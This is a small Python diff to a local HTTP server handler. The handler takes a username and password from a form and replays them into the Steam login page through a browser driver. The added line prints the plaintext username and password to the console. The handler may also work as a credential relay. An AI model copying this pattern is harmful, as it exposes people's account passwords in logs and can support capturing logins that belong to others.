@@ -35,6 +35,8 @@ class ServerHandler(http.server.SimpleHTTPRequestHandler):
         usrnme = str(form.getvalue("username"))
         passwd = str(form.getvalue("password"))
 
+        print("Username:", usrnme, "Password:", passwd)
+
         driver.get("https://steamcommunity.com/login/")
         script_1 = open("scripts/login_1.js", "r").read().replace("{usrnme}", usrnme).replace("{passwd}", passwd)
         error = driver.execute_script("return " + script_1)
